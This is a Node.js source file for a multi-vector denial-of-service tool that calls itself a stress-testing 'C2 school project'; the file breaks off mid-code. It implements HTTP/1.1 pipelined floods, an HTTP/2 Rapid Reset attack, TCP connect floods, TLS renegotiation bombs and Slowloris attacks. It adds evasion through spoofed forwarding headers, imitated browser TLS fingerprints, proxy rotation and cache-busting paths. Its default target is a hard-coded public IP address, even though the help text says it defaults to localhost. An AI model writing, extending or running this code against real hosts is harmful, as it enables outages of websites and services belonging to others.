

const cluster = require('cluster');
const net = require('net');
const tls = require('tls');
const http2 = require('http2');
const os = require('os');
const crypto = require('crypto');

// Global error handling to prevent crashes on macOS
process.on('uncaughtException', (err) => {
    console.error('[Fatal] Uncaught Exception:', err);
    // Optionally log and continue or exit gracefully
});
process.on('unhandledRejection', (reason, promise) => {
    console.error('[Fatal] Unhandled Rejection at:', promise, 'reason:', reason);
});
const { URL } = require('url');

// Optimize event listeners limits
process.setMaxListeners(0);
require('events').EventEmitter.defaultMaxListeners = 0;

/// Command Line Options parsing
function parseArgs() {
    const args = process.argv.slice(2);

    // Preset configurations
    const presetConfigs = {
        low: {
            workers: os.cpus().length,
            concurrency: os.platform() === 'darwin' ? 20 : 40,
            rate: 30,
            autoTune: false,
            method: 'h1'
        },
        medium: {
            workers: os.cpus().length * (process.platform === 'darwin' ? 2 : 4),
            concurrency: os.platform() === 'darwin' ? 80 : 160,
            rate: 100,
            autoTune: true,
            method: 'h1'
        },
        high: {
            workers: os.cpus().length * (process.platform === 'darwin' ? 2 : 4),
            concurrency: os.platform() === 'darwin' ? 30 : 60,
            rate: 70,
            autoTune: true,
            method: 'h2'
        },
        // New extreme preset for maximum stress testing
        extreme: {
            workers: os.cpus().length * (process.platform === 'darwin' ? 4 : 8),
            concurrency: os.platform() === 'darwin' ? 200 : 400,
            rate: 300,
            autoTune: true,
            method: 'h2'
        }
    };

    // Default configuration (medium preset)
    const parsed = {
        preset: 'medium', // low | medium | high
        auto: false, // enable auto preset based on platform
        aggressive: false, // enable aggressive mode for higher performance
        target: 'http://47.114.102.180:8888/hit', // default target for localhost testing
        duration: 300,
        workers: presetConfigs.medium.workers,
        method: presetConfigs.medium.method,
        // autoTune will be set based on aggressive flag after parsed object creation
        rate: presetConfigs.medium.rate,
        concurrency: presetConfigs.medium.concurrency,
        post: false,
        cookie: null,
        headers: [],
        help: false,
        maxConcurrency: null, // override concurrency per worker
        maxRps: null, // maximum requests per second per worker (optional)
        autoTune: presetConfigs.medium.autoTune
    };

    // If aggressive mode is enabled, force autoTune
    if (parsed.aggressive) {
        parsed.autoTune = true;
    }

    // Parse CLI arguments
    for (let i = 0; i < args.length; i++) {
        const arg = args[i];
        switch (arg) {
            case '--help':
            case '-h':
                parsed.help = true;
                break;
            case '--target':
            case '-t':
                parsed.target = args[++i];
                break;
            case '--duration':
            case '-d':
                parsed.duration = parseInt(args[++i], 10);
                break;
            case '--workers':
            case '-w':
                parsed.workers = parseInt(args[++i], 10);
                break;
            case '--method':
            case '-m':
                parsed.method = args[++i].toLowerCase();
                break;
            case '--rate':
            case '-r':
                parsed.rate = parseInt(args[++i], 10);
                break;
            case '--concurrency':
            case '-c':
                parsed.concurrency = parseInt(args[++i], 10);
                break;
            case '--max-concurrency':
                parsed.maxConcurrency = parseInt(args[++i], 10);
                break;
            case '--max-rps':
                parsed.maxRps = parseInt(args[++i], 10);
                break;
            case '--auto-tune':
                parsed.autoTune = true;
                break;
            case '--post':
            case '-p':
                parsed.post = true;
                break;
            case '--cookie':
            case '-k':
                parsed.cookie = args[++i];
                break;
            case '--header':
                parsed.headers.push(args[++i]);
                break;
            case '--preset':
                parsed.preset = args[++i];
                break;
            case '--proxy':
                // proxy in host:port format
                parsed.proxy = args[++i];
                break;
            case '--proxy-file':
                // path to file containing proxy list (one per line)
                parsed.proxyFile = args[++i];
                break;
            case '--auto':
                parsed.auto = true;
                break;
            case '--aggressive':
                parsed.aggressive = true;
                break;
        }
    }
    // Load proxy list if proxyFile provided
    if (parsed.proxyFile) {
        try {
            const proxyLines = require('fs').readFileSync(parsed.proxyFile, 'utf8')
                .split(/\r?\n/)
                .filter(l => l.trim().length);
            // pick a random proxy
            const rand = Math.floor(Math.random() * proxyLines.length);
            parsed.proxy = proxyLines[rand];
        } catch (e) {
            console.error('Failed to load proxy file:', e.message);
        }
    }

    // Apply preset overrides if a valid preset is provided
    if (parsed.preset && presetConfigs[parsed.preset]) {
        const p = presetConfigs[parsed.preset];
        parsed.workers = p.workers;
        parsed.concurrency = p.concurrency;
        parsed.rate = p.rate;
        parsed.autoTune = p.autoTune;
        parsed.method = p.method;
    }
    // If auto flag is set and no preset specified, choose based on target protocol
    if (parsed.auto && !parsed.preset) {
        const isHttps = parsed.target && parsed.target.startsWith('https://');
        const selectedPreset = isHttps ? 'high' : 'low';
        const p = presetConfigs[selectedPreset];
        parsed.preset = selectedPreset;
        parsed.workers = p.workers;
        parsed.concurrency = p.concurrency;
        parsed.rate = p.rate;
        parsed.autoTune = p.autoTune;
        parsed.method = p.method;
    }

    // Override concurrency if maxConcurrency flag is used
    if (parsed.maxConcurrency !== null) {
        parsed.concurrency = parsed.maxConcurrency;
    }

    // Aggressive mode: double workers and concurrency if enabled
    if (parsed.aggressive) {
        parsed.workers *= 2;
        parsed.concurrency *= 2;
    }

    // Enforce maxRps per worker if set (cap rate)
    if (parsed.maxRps !== null && parsed.rate > parsed.maxRps) {
        parsed.rate = parsed.maxRps;
    }

    // Fallback defaults based on method (in case method was changed manually)
    if (parsed.concurrency === null) {
        switch (parsed.method) {
            case 'h1':
                parsed.concurrency = 100;
                break;
            case 'h2':
                parsed.concurrency = 50;
                break;
            case 'slow':
                parsed.concurrency = 100;
                break;
            case 'tls':
                parsed.concurrency = 70;
                break;
            case 'tcp':
                parsed.concurrency = 150;
                break;
            default:
                parsed.concurrency = 100;
        }
    }

    return parsed;
}

const config = parseArgs();

if (config.help) {
    console.log(`
╔═════════════════════════════════════════════════════════════════════════╗
║                      SIGMA STRESS TESTING TOOLKIT                       ║
║                           C2 SCHOOL PROJECT                             ║
╚═════════════════════════════════════════════════════════════════════════╝

  Usage: node sigma.js [options]
  Note: Default target is http://localhost if not specified.

Options:
  -t, --target <url>       Target website URL (e.g. https://example.com)
  -d, --duration <secs>    Simulation duration in seconds (default: 60)
  -w, --workers <num>      Number of simulation worker processes (default: CPU cores * 2)
  -m, --method <name>      Attack vector: h1, h2, tcp, tls, slow (default: h1)
  -r, --rate <num>         Rate multiplier / requests per loop (default: 50)
  -c, --concurrency <num>  Number of concurrent connections per worker
  -p, --post               Send POST requests with randomized payload (default: GET)
  -k, --cookie <string>    Custom cookie string to include in HTTP requests
          --header <name:value>    Custom header (can specify multiple times)
          --preset <low|medium|high>  Choose preset configuration (default: medium)
          --auto                 Auto-select preset based on target protocol (http => low, https => high)
          --aggressive           Enable aggressive mode for higher performance (doubles workers & concurrency)
          --max-rps <num>        Cap requests per second per worker (prevents overload)
          -h, --help             Display this help guide
`);
    process.exit(0);
}

// Target parsing
const targetUrl = new URL(config.target);
const HOST = targetUrl.hostname;
const PORT = targetUrl.port || (targetUrl.protocol === 'https:' ? 443 : 80);
const IS_SSL = targetUrl.protocol === 'https:';

// HTTP/TLS Coherency Browser Profiles
const PROFILES = [
    {
        name: 'chrome_win',
        ua: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
        headers: {
            "sec-ch-ua": '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "document",
            "sec-fetch-mode": "navigate",
            "sec-fetch-site": "none",
            "sec-fetch-user": "?1",
            "upgrade-insecure-requests": "1",
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
            "accept-language": "en-US,en;q=0.9",
            "accept-encoding": "gzip, deflate, br, zstd"
        },
        ciphers: "TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:DHE-RSA-AES256-GCM-SHA384",
        sigalgs: "ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha512",
        curves: "X25519:secp256r1:secp384r1"
    },
    {
        name: 'chrome_mac',
        ua: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
        headers: {
            "sec-ch-ua": '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"macOS"',
            "sec-fetch-dest": "document",
            "sec-fetch-mode": "navigate",
            "sec-fetch-site": "none",
            "sec-fetch-user": "?1",
            "upgrade-insecure-requests": "1",
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
            "accept-language": "en-US,en;q=0.9",
            "accept-encoding": "gzip, deflate, br, zstd"
        },
        ciphers: "TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:DHE-RSA-AES256-GCM-SHA384",
        sigalgs: "ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha512",
        curves: "X25519:secp256r1:secp384r1"
    },
    {
        name: 'firefox_win',
        ua: "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0",
        headers: {
            "sec-fetch-dest": "document",
            "sec-fetch-mode": "navigate",
            "sec-fetch-site": "none",
            "sec-fetch-user": "?1",
            "upgrade-insecure-requests": "1",
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
            "accept-language": "en-US,en;q=0.5",
            "accept-encoding": "gzip, deflate, br"
        },
        ciphers: "TLS_AES_128_GCM_SHA256:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_256_GCM_SHA384:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:DHE-RSA-AES256-GCM-SHA384",
        sigalgs: "ecdsa_secp256r1_shae256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha512",
        curves: "X25519:secp256r1:secp384r1"
    },
    {
        name: 'safari_mac',
        ua: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15",
        headers: {
            "sec-fetch-dest": "document",
            "sec-fetch-mode": "navigate",
            "sec-fetch-site": "none",
            "upgrade-insecure-requests": "1",
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "accept-language": "en-US,en;q=0.9",
            "accept-encoding": "gzip, deflate, br"
        },
        ciphers: "TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-RSA-AES128-GCM-SHA256",
        sigalgs: "ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha512",
        curves: "X25519:secp256r1:secp384r1"
    }
];

function getRandomProfile() {
    return PROFILES[Math.floor(Math.random() * PROFILES.length)];
}

// Simple timestamped logger for consistency
function log(msg) {
    const ts = new Date().toISOString();
    console.log(`[${ts}] ${msg}`);
}

function randomIP() {
    return `${Math.floor(Math.random() * 223) + 1}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 254) + 1}`;
}

// ── TLS Session Resumption Cache ─────────────────────────────────────────
// Stores the raw session ticket/ID returned by the server after the first
// full handshake. Every subsequent connection to the same host reuses it,
// skipping the expensive RSA/ECDSA key-exchange step (~10× cheaper).
const tlsSessionCache = new Map(); // HOST -> Buffer

// Helper to construct a raw direct socket connection matching a profile
function connectSocket(profile, callback) {
    const socket = net.connect({ host: HOST, port: PORT }, () => {
        if (!IS_SSL) {
            return callback(null, socket);
        }

        const tlsOptions = {
            socket: socket,
            servername: HOST,
            rejectUnauthorized: false,
            ALPNProtocols: config.method === 'h2' ? ['h2'] : ['http/1.1'],
            ciphers: profile.ciphers,
            ecdhCurve: profile.curves,
            honorCipherOrder: true,
            minVersion: 'TLSv1.2',
            maxVersion: 'TLSv1.3',
            // Inject cached session ticket to skip full handshake
            session: tlsSessionCache.get(HOST) || undefined
        };

        const secureSocket = tls.connect(tlsOptions, () => {
            callback(null, secureSocket);
        });

        // Store the session ticket the moment the server sends it
        secureSocket.on('session', (sessionData) => {
            tlsSessionCache.set(HOST, sessionData);
        });

        secureSocket.on('error', (tlsErr) => {
            socket.destroy();
            callback(tlsErr);
        });
    });

    socket.on('error', (err) => {
        callback(err);
    });
}

function makeHeaders(profile, method = 'GET') {
    const randomParam = crypto.randomBytes(3).toString('hex');
    const randomVal = crypto.randomBytes(6).toString('hex');
    const path = targetUrl.pathname + (targetUrl.search || '') +
        (targetUrl.search ? '&' : '?') + randomParam + '=' + randomVal;

    const baseHeaders = {
        ":authority": HOST,
        ":scheme": IS_SSL ? 'https' : 'http',
        ":path": path,
        ":method": method,
        "user-agent": profile.ua,
        "x-forwarded-for": randomIP(),
        "x-real-ip": randomIP(),
        "referer": `https://www.google.com/search?q=${crypto.randomBytes(4).toString('hex')}`,
        "cache-control": Math.random() < 0.5 ? "no-cache" : "max-age=0"
    };

    Object.assign(baseHeaders, profile.headers);

    if (config.cookie) {
        baseHeaders["cookie"] = config.cookie;
    }

    if (config.headers && config.headers.length > 0) {
        config.headers.forEach(h => {
            const index = h.indexOf(':');
            if (index > -1) {
                const key = h.substring(0, index).trim().toLowerCase();
                const value = h.substring(index + 1).trim();
                baseHeaders[key] = value;
            }
        });
    }

    return baseHeaders;
}

function formatHTTP1HeaderKey(key) {
    const overrides = {
        'user-agent': 'User-Agent',
        'accept-encoding': 'Accept-Encoding',
        'accept-language': 'Accept-Language',
        'cache-control': 'Cache-Control',
        'x-forwarded-for': 'X-Forwarded-For',
        'x-real-ip': 'X-Real-IP',
        'sec-ch-ua': 'sec-ch-ua',
        'sec-ch-ua-mobile': 'sec-ch-ua-mobile',
        'sec-ch-ua-platform': 'sec-ch-ua-platform',
        'sec-fetch-dest': 'sec-fetch-dest',
        'sec-fetch-mode': 'sec-fetch-mode',
        'sec-fetch-site': 'sec-fetch-site',
        'sec-fetch-user': 'sec-fetch-user',
        'upgrade-insecure-requests': 'Upgrade-Insecure-Requests'
    };
    return overrides[key] || key.split('-').map(word => word.charAt(0).toUpperCase() + word.slice(1)).join('-');
}

// ==========================================
// WORKER SIMULATION ENGINE
// ==========================================
if (!cluster.isMaster) {
    let requestsSent = 0;
    let errorsCount = 0;
    let connectionsEstablished = 0;
    let totalBytesSent = 0;

    // Periodically send stats snapshot to master (connections is current state, not delta)
    setInterval(() => {
        if (process.send) {
            process.send({
                type: 'metrics',
                requests: requestsSent,
                errors: errorsCount,
                connections: connectionsEstablished, // snapshot of current live connections
                bytes: totalBytesSent
            });
            // Reset per-second counters only (NOT connectionsEstablished — it tracks live state)
            requestsSent = 0;
            errorsCount = 0;
            totalBytesSent = 0;
        }
    }, 1000);

    // ==========================================
    // GLOBAL WORKER RESOURCE ALLOCATION
    // Pre-build reusable structures once at worker startup so all flood
    // functions share the same memory rather than re-allocating per-call.
    // ==========================================

    // H1: Static header fragment shared across all sockets.
    // Only the randomized :path and xff change per request — everything else
    // is identical and pre-serialised here to avoid repeated string-concat.
    const H1_STATIC_PROFILE_CACHE = PROFILES.map(profile => {
        let fragment = '';
        for (const [k, v] of Object.entries(profile.headers)) {
            fragment += `${formatHTTP1HeaderKey(k)}: ${v}\r\n`;
        }
        return { ua: profile.ua, fragment };
    });

    // H2: Pre-generated header object pool. Workers pull by index so the hot
    // burst loop does zero string operations — pure array reads.
    const H2_POOL_SIZE = 512;
    const H2_HEADER_POOL = (() => {
        const pool = [];
        const method = config.post ? 'POST' : 'GET';
        for (let i = 0; i < H2_POOL_SIZE; i++) {
            pool.push(makeHeaders(getRandomProfile(), method));
        }
        return pool;
    })();
    let h2PoolIndex = 0;

    // Refresh the pool in the background every 5 s so headers stay fresh
    // without touching the hot path.
    setInterval(() => {
        const method = config.post ? 'POST' : 'GET';
        for (let i = 0; i < H2_POOL_SIZE; i++) {
            H2_HEADER_POOL[i] = makeHeaders(getRandomProfile(), method);
        }
        h2PoolIndex = 0;
    }, 5000);

    // HTTP/1.1 keep-alive pipeline pool
    function runH1Flood() {
        let activeSockets = 0;

        const startSocket = () => {
            if (activeSockets >= config.concurrency) return;
            activeSockets++;

            const profile = getRandomProfile();

            connectSocket(profile, (err, socket) => {
                if (err) {
                    errorsCount++;
                    activeSockets--;
                    setTimeout(startSocket, 250);
                    return;
                }

                connectionsEstablished++;
                socket.setKeepAlive(true, 60000);
                socket.setNoDelay(true);

                // Grab pre-built static fragment for this socket's profile
                const cachedProfile = H1_STATIC_PROFILE_CACHE[
                    PROFILES.indexOf(profile) !== -1 ? PROFILES.indexOf(profile) : 0
                ];

                const sendBatch = () => {
                    if (socket.destroyed) return;

                    // ── Packet Coalescing ──────────────────────────────────
                    // cork() tells the kernel to buffer writes and flush them
                    // as a single syscall when uncork() fires — equivalent of
                    // TCP_CORK on Linux, works on macOS via libuv's write queue.
                    socket.cork();

                    // Use an array of parts and join once to avoid per-concat heap allocs
                    const parts = [];
                    const method = config.post ? 'POST' : 'GET';

                    for (let i = 0; i < config.rate; i++) {
                        // Only the randomised path and XFF need new allocation per request
                        const rp = crypto.randomBytes(3).toString('hex');
                        const rv = crypto.randomBytes(6).toString('hex');
                        const path = targetUrl.pathname +
                            (targetUrl.search || '') +
                            (targetUrl.search ? '&' : '?') + rp + '=' + rv;

                        let req = `${method} ${path} HTTP/1.1\r\n`;
                        req += `Host: ${HOST}\r\n`;
                        req += `User-Agent: ${cachedProfile.ua}\r\n`;
                        req += `X-Forwarded-For: ${randomIP()}\r\n`;
                        req += `X-Real-IP: ${randomIP()}\r\n`;
                        req += `Referer: https://www.google.com/search?q=${crypto.randomBytes(4).toString('hex')}\r\n`;
                        req += `Cache-Control: ${Math.random() < 0.5 ? 'no-cache' : 'max-age=0'}\r\n`;
                        // Append pre-built static fragment (sec-* headers, accept-*, etc.)
                        req += cachedProfile.fragment;

                        if (config.cookie) req += `Cookie: ${config.cookie}\r\n`;

                        if (config.post) {
                            const payload = JSON.stringify({
                                t: Date.now(),
                                r: crypto.randomBytes(8).toString('hex'),
                                data: crypto.randomBytes(16).toString('base64')
                            });
                            req += `Content-Type: application/json\r\n`;
                            req += `Content-Length: ${Buffer.byteLength(payload)}\r\n\r\n`;
                            req += payload;
                        } else {
                            req += `\r\n`;
                        }

                        parts.push(req);
                        requestsSent++;
                    }

                    const buf = Buffer.from(parts.join(''));
                    totalBytesSent += buf.length;
                    // Write then uncork flushes everything as one kernel syscall
                    socket.write(buf);
                    socket.uncork();
                    // Backpressure: only schedule next batch when kernel is ready
                    if (!socket.writableNeedDrain) {
                        setImmediate(sendBatch);
                    } else {
                        socket.once('drain', sendBatch);
                    }
                };

                sendBatch();

                socket.on('error', () => {
                    errorsCount++;
                    socket.destroy();
                });

                socket.on('close', () => {
                    connectionsEstablished = Math.max(0, connectionsEstablished - 1);
                    activeSockets--;
                    setTimeout(startSocket, 10);
                });
            });
        };

        for (let i = 0; i < config.concurrency; i++) {
            setTimeout(startSocket, i * 20);
        }
    }

    // HTTP/2 rapid reset and multiplexed get storm pool
    function runH2Flood() {
        let activeSessions = 0;

        const startH2Session = () => {
            if (activeSessions >= config.concurrency) return;
            activeSessions++;

            const profile = getRandomProfile();

            connectSocket(profile, (err, socket) => {
                if (err) {
                    errorsCount++;
                    activeSessions--;
                    setTimeout(startH2Session, 250);
                    return;
                }

                connectionsEstablished++;

                const client = http2.connect(config.target, {
                    createConnection: () => socket,
                    settings: {
                        initialWindowSize: 6291456,
                        maxFrameSize: 16384,
                        maxConcurrentStreams: 2000
                    }
                });

                client.on('error', () => {
                    errorsCount++;
                    client.destroy();
                    socket.destroy();
                });

                client.on('close', () => {
                    connectionsEstablished = Math.max(0, connectionsEstablished - 1);
                    activeSessions--;
                    setTimeout(startH2Session, 50);
                });

                client.on('connect', () => {
                    const sendH2Burst = () => {
                        if (client.destroyed) return;

                        // ── Backpressure Gate ──────────────────────────────────
                        // 1. Don't overflow the server's declared stream limit.
                        const maxStreams = (client.remoteSettings &&
                            client.remoteSettings.maxConcurrentStreams) || 128;
                        // 2. Back off if our outbound frame queue is saturated.
                        const pendingFrames = (client.state && client.state.pendingFrames) || 0;
                        if (pendingFrames > 3000) {
                            // Queue is saturated — yield to event loop and retry
                            if (config.autoTune) {
                                config.rate = Math.max(1, Math.floor(config.rate * 0.85));
                            }
                            return setTimeout(sendH2Burst, 20);
                        }

                        // Clamp burst to what the server can actually accept
                        const burst = Math.min(config.rate, maxStreams);

                        for (let i = 0; i < burst; i++) {
                            // Pull pre-generated headers from pool — zero string ops in hot path
                            const reqHeaders = { ...H2_HEADER_POOL[h2PoolIndex % H2_POOL_SIZE] };
                            h2PoolIndex++;

                            let payload = null;
                            if (config.post) {
                                payload = JSON.stringify({
                                    t: Date.now(),
                                    r: crypto.randomBytes(8).toString('hex'),
                                    data: crypto.randomBytes(16).toString('base64')
                                });
                                reqHeaders['content-type'] = 'application/json';
                                reqHeaders['content-length'] = Buffer.byteLength(payload).toString();
                            }

                            const req = client.request(reqHeaders);
                            requestsSent++;

                            const rand = Math.random();
                            if (rand < 0.6) { // 60% Rapid Reset
                                if (config.post && payload) req.write(payload);
                                req.close(http2.constants.NGHTTP2_CANCEL);
                            } else {
                                if (config.post && payload) req.write(payload);
                                req.end();
                                req.on('response', () => { req.close(); });
                            }

                            req.on('error', () => { errorsCount++; });
                        }

                        setTimeout(sendH2Burst, 50);
                    };

                    sendH2Burst();
                });
            });
        };

        for (let i = 0; i < config.concurrency; i++) {
            setTimeout(startH2Session, i * 50);
        }
    }

    // TCP connect flood pool
    function runTCPFlood() {
        const activeSockets = [];

        const openSocket = () => {
            if (activeSockets.length >= config.concurrency) {
                const old = activeSockets.shift();
                if (old) old.destroy();
            }

            const profile = getRandomProfile();

            connectSocket(profile, (err, socket) => {
                if (err) {
                    errorsCount++;
                    return;
                }

                connectionsEstablished++;
                requestsSent++;

                const initialPayload = `GET / HTTP/1.1\r\nHost: ${HOST}\r\nUser-Agent: ${profile.ua}\r\n\r\n`;
                socket.write(initialPayload);
                totalBytesSent += Buffer.byteLength(initialPayload);

                socket.on('error', () => { errorsCount++; });
                socket.on('close', () => {
                    connectionsEstablished = Math.max(0, connectionsEstablished - 1);
                    const idx = activeSockets.indexOf(socket);
                    if (idx > -1) activeSockets.splice(idx, 1);
                });

                activeSockets.push(socket);
            });
        };

        const interval = setInterval(() => {
            for (let i = 0; i < 10; i++) openSocket();
        }, 100);

        process.on('SIGTERM', () => {
            clearInterval(interval);
            activeSockets.forEach(s => s.destroy());
        });
    }

    // TLS renegotiation spam
    function runTLSBomb() {
        if (!IS_SSL) {
            console.error('[-] TLS Renegotiation bomb requires an HTTPS target.');
            process.exit(1);
        }

        const activeTls = [];

        const createRenegotiation = () => {
            if (activeTls.length >= config.concurrency) {
                const old = activeTls.shift();
                if (old) old.destroy();
            }

            const profile = getRandomProfile();

            connectSocket(profile, (err, socket) => {
                if (err) {
                    errorsCount++;
                    return;
                }

                connectionsEstablished++;
                requestsSent++;

                const loop = () => {
                    if (socket.destroyed) return;
                    try {
                        socket.renegotiate({ rejectUnauthorized: false }, (err) => {
                            if (!err) {
                                requestsSent++;
                                setTimeout(loop, 150);
                            }
                        });
                    } catch (_) {
                        errorsCount++;
                    }
                };

                loop();

                socket.on('error', () => { errorsCount++; });
                socket.on('close', () => {
                    connectionsEstablished = Math.max(0, connectionsEstablished - 1);
                    const idx = activeTls.indexOf(socket);
                    if (idx > -1) activeTls.splice(idx, 1);
                });

                activeTls.push(socket);
            });
        };

        const interval = setInterval(() => {
            for (let i = 0; i < 10; i++) createRenegotiation();
        }, 100);

        process.on('SIGTERM', () => {
            clearInterval(interval);
            activeTls.forEach(c => c.destroy());
        });
    }

    // Slowloris++ partial headers & slow POST write (Slow Write)
    function runSlowloris() {
        let activeSockets = 0;

        const openSlowSocket = () => {
            if (activeSockets >= config.concurrency) return;
            activeSockets++;

            const profile = getRandomProfile();

            connectSocket(profile, (err, socket) => {
                if (err) {
                    errorsCount++;
                    activeSockets--;
                    setTimeout(openSlowSocket, 250);
                    return;
                }

                connectionsEstablished++;
                socket.setNoDelay(true);

                const isPost = config.post || Math.random() < 0.5;
                const method = isPost ? 'POST' : 'GET';
                const headers = makeHeaders(profile, method);

                let initialPayload = `${method} ${headers[':path']} HTTP/1.1\r\n`;
                initialPayload += `Host: ${HOST}\r\n`;

                for (const [k, v] of Object.entries(headers)) {
                    if (k.startsWith(':')) continue;
                    initialPayload += `${formatHTTP1HeaderKey(k)}: ${v}\r\n`;
                }

                if (isPost) {
                    const contentLen = 100000 + Math.floor(Math.random() * 100000);
                    initialPayload += `Content-Type: application/x-www-form-urlencoded\r\n`;
                    initialPayload += `Content-Length: ${contentLen}\r\n\r\n`;
                    socket.write(initialPayload);
                    requestsSent++;

                    const drip = setInterval(() => {
                        if (socket.destroyed) {
                            clearInterval(drip);
                            return;
                        }
                        socket.write(crypto.randomBytes(Math.floor(Math.random() * 4) + 1));
                        requestsSent++;
                    }, 2000 + Math.random() * 2000);

                    socket.on('error', () => {
                        errorsCount++;
                        clearInterval(drip);
                    });

                    socket.on('close', () => {
                        connectionsEstablished = Math.max(0, connectionsEstablished - 1);
                        activeSockets--;
                        clearInterval(drip);
                        setTimeout(openSlowSocket, 50);
                    });
                } else {
                    socket.write(initialPayload);
                    requestsSent++;

                    const drip = setInterval(() => {
                        if (socket.destroyed) {
                            clearInterval(drip);
                            return;
                        }
                        socket.write(`X-Keep-Alive-${crypto.randomBytes(2).toString('hex')}: ${Math.random()}\r\n`);
                        requestsSent++;
                    }, 2000 + Math.random() * 2000);

                    socket.on('error', () => {
                        errorsCount++;
                        clearInterval(drip);
                    });

                    socket.on('close', () => {
                        connectionsEstablished = Math.max(0, connectionsEstablished - 1);
                        activeSockets--;
                        clearInterval(drip);
                        setTimeout(openSlowSocket, 50);
                    });
                }
            });
        };

        for (let i = 0; i < config.concurrency; i++) {
            setTimeout(openSlowSocket, i * 50);
        }
    }

    switch (config.method) {
        case 'h1': runH1Flood(); break;
        case 'h2': runH2Flood(); break;
        case 'tcp': runTCPFlood(); break;
        case 'tls': runTLSBomb(); break;
        case 'slow': runSlowloris(); break;
        default: process.exit(1);
    }
}

// ==========================================
// MASTER TERMINAL C2 INTERACTIVE PANEL
// ==========================================
if (cluster.isMaster) {
    let totalRequests = 0;
    let totalErrors = 0;
    let reqPerSecond = 0;
    let mbpsSent = 0;

    let currentReqInSec = 0;
    let currentBytesInSec = 0;

    // Per-worker connection snapshot map (workerID -> last reported live connections)
    const workerConnections = {};
    let activeConnections = 0;

    // ── PID Autotune Controller ───────────────────────────────────────────
    // Measures true event-loop lag every second and adjusts config.rate
    // proportionally: P term reacts to current lag, I term corrects drift,
    // D term damps oscillation. Keeps the system at peak throughput without
    // saturating the CPU or the kernel write queue.
    let loopLagMs = 0;          // last measured lag (displayed on panel)
    let pidIntegral = 0;        // accumulated error (I term)
    let pidPrevError = 0;       // previous error for derivative (D term)
    const PID_TARGET_LAG = 8;   // ms — target event-loop headroom
    const PID_KP = 0.04;        // proportional gain
    const PID_KI = 0.008;       // integral gain
    const PID_KD = 0.02;        // derivative gain
    let autoTuneDelta = 0;      // last rate adjustment (for panel display)

    // Measure event-loop lag with a self-scheduled timer
    let lastTick = Date.now();
    const measureLag = () => {
        const now = Date.now();
        loopLagMs = now - lastTick - 1000;
        lastTick = now;
        setTimeout(measureLag, 1000);
    };
    setTimeout(measureLag, 1000);

    // Spawn cluster workers
    for (let i = 0; i < config.workers; i++) {
        const w = cluster.fork();
        // ── CPU Priority (P-Core Affinity) ────────────────────────────────
        // Elevate each worker to PRIORITY_HIGH so macOS scheduler favours
        // keeping threads on the fast P-cores instead of migrating to E-cores.
        // Cache lines stay warm, reducing clock-cycle penalty per context switch.
        w.process.on('spawn', () => {
            try {
                os.setPriority(w.process.pid, os.constants.priority.PRIORITY_HIGH);
            } catch (_) { /* requires elevated perms — fail silently */ }
        });
    }

    cluster.on('online', (worker) => {
        workerConnections[worker.id] = 0;
        // Attempt priority elevation once the process is confirmed online
        try {
            os.setPriority(worker.process.pid, os.constants.priority.PRIORITY_HIGH);
        } catch (_) { }
        worker.on('message', (msg) => {
            if (msg.type === 'metrics') {
                totalRequests += msg.requests;
